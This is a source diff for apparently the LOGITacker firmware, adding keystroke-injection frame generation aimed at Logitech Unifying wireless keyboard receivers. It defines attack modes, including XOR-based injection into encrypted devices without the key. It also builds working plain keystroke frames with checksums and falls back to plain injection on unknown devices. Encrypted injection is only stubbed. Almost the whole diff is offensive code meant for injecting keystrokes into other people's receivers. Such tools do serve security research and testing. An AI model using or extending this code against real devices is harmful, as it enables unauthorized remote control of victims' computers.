@@ -301,3 +301,73 @@ void logitacker_device_update_counters_from_frame(uint8_t const * const rf_addr,
             p_frame_counters->typed[LOGITACKER_COUNTER_TYPE_UNIFYING_PLAIN_KEYBOARD]);
     }
 }
+
+typedef enum {
+    KEYBOARD_REPORT_GEN_MODE_PLAIN, // device accepts plain keystrokes
+    KEYBOARD_REPORT_GEN_MODE_ENCRYPTED, // device accepts only encrypted keystrokes, key needed
+    KEYBOARD_REPORT_GEN_MODE_ENCRYPTED_COUNTER_FLUSH, // same as encrypted, but enough key releases are sent upfront, to overflow the counter buffer of the receiver (slower)
+    KEYBOARD_REPORT_GEN_MODE_ENCRYPTED_XOR_SINGLE, // encrypted injection, without knowledge of keys (targets weak XOR encryption, needs a single "whitened frame")
+    KEYBOARD_REPORT_GEN_MODE_ENCRYPTED_XOR, // encrypted injection, without knowledge of keys (targets weak XOR encryption, even if counter reuse is fixed needs about 24 "whitened frame")
+} keyboard_report_gen_mode_t;
+
+
+
+uint32_t logitacker_device_generate_keyboard_frame_plain(nrf_esb_payload_t * p_result_payload, hid_keyboard_report_t const * const p_in_hid_report) {
+    /*
+     * 07 C1 00 00 00 00 00 00 00 38
+     */
+
+    p_result_payload->length = 10;
+    p_result_payload->data[0] = 0x00; //device index
+    p_result_payload->data[1] = UNIFYING_RF_REPORT_PLAIN_KEYBOARD | UNIFYING_RF_REPORT_BIT_KEEP_ALIVE | UNIFYING_RF_REPORT_BIT_UNKNOWN; //c1
+    p_result_payload->data[2] = p_in_hid_report->mod;
+    p_result_payload->data[3] = p_in_hid_report->keys[0];
+    p_result_payload->data[4] = p_in_hid_report->keys[1];
+    p_result_payload->data[5] = p_in_hid_report->keys[2];
+    p_result_payload->data[6] = p_in_hid_report->keys[3];
+    p_result_payload->data[7] = p_in_hid_report->keys[4];
+    p_result_payload->data[8] = p_in_hid_report->keys[5];
+    p_result_payload->data[9] = 0x00; // will be overwritten by logitech checksum
+    unifying_payload_update_checksum(p_result_payload->data, p_result_payload->length);
+
+    return NRF_SUCCESS;
+}
+
+uint32_t logitacker_device_generate_keyboard_frame_encrypted(logitacker_device_capabilities_t const * const p_caps, nrf_esb_payload_t * p_result_payload, hid_keyboard_report_t const * const p_in_hid_report) {
+    NRF_LOG_WARNING("Encrypted injection not implemented, yet");
+    return NRF_ERROR_INVALID_PARAM;
+}
+
+uint32_t logitacker_device_generate_keyboard_frame(logitacker_device_capabilities_t * p_caps, nrf_esb_payload_t * p_result_payload, hid_keyboard_report_t const * const p_in_hid_report) {
+    keyboard_report_gen_mode_t mode = KEYBOARD_REPORT_GEN_MODE_PLAIN;
+
+    if (p_caps != NULL) {
+        if (p_caps->is_encrypted) {
+            if (p_caps->key_known) {
+                mode = KEYBOARD_REPORT_GEN_MODE_ENCRYPTED;
+            } else {
+                if (p_caps->has_enough_whitened_reports) {
+                    mode = KEYBOARD_REPORT_GEN_MODE_ENCRYPTED_XOR;
+                } else if (p_caps->has_single_whitened_report) {
+                    mode = KEYBOARD_REPORT_GEN_MODE_ENCRYPTED_XOR_SINGLE;
+                } else {
+                    NRF_LOG_WARNING("No proper key injection mode for device, fallback to PLAIN injection");
+                }
+            }
+        }
+    } else {
+        NRF_LOG_WARNING("Device with unknown capabilities, trying PLAIN injection");
+    }
+
+
+
+    switch (mode) {
+        case KEYBOARD_REPORT_GEN_MODE_PLAIN:
+            return logitacker_device_generate_keyboard_frame_plain(p_result_payload, p_in_hid_report);
+        case KEYBOARD_REPORT_GEN_MODE_ENCRYPTED:
+            return logitacker_device_generate_keyboard_frame_encrypted(p_caps, p_result_payload, p_in_hid_report);
+        default:
+            return logitacker_device_generate_keyboard_frame_plain(p_result_payload, p_in_hid_report);
+    }
+
+}
